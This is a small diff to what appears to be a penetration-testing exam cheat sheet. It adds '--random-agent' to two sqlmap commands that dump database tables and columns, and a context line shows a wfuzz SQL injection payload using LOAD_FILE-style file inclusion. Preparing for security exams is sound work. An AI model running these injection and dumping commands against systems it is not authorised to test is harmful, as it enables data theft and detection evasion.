@@ -135,8 +135,8 @@ wfuzz -z file,/tmp/file_inclusion_linux.txt -d "username=' UNION SELECT 1, LOAD_
 ### :no_entry: sqlmap (:radioactive::radioactive::radioactive: cannot be used in the exam)
 
 ```
-sqlmap -u "url" --dump -C "columns" -T "tables" -D "database" 
-sqlmap -r post.txt -p "parameter_name" --dump -C "columns" -T "tables" -D "database"
+sqlmap -u "url" --dump -C "columns" -T "tables" -D "database" --random-agent 
+sqlmap -r post.txt -p "parameter_name" --dump -C "columns" -T "tables" -D "database" --random-agent
 ```
 
 post.txt = request contents
